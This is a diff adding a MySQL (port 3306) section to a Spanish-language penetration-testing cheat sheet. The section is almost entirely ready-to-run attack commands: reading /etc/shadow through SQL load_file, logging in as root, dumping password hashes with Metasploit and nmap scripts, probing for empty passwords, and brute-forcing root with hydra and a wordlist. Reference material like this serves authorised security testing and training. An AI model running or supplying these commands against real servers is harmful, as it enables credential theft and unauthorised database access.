@@ -111,3 +111,25 @@ Lista de palabras para ataques de fuerza bruta
 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 /usr/share/metasploit-framework/data/wordlists/common_users.txt
 ```
+
+### MYSQL 3306
+MySQL es un sistema de gestión de bases de datos relacional ampliamente utilizado. Utiliza el puerto 3306 para permitir conexiones entre aplicaciones y bases de datos, facilitando el almacenamiento y recuperación eficiente de datos estructurados.
+
+```python
+select load_file("/etc/shadow");
+mysql -h IP -u root
+use auxiliary/scanner/mysql/mysql_hashdump
+nmap --script=mysql-empty-password -p 3306 IP
+nmap --script=mysql-info -p 3306 IP
+nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 IP
+nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 IP
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql
+hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql
+```
+
+#### Diccionarios
+Lista de palabras para ataques de fuerza bruta
+
+```python
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
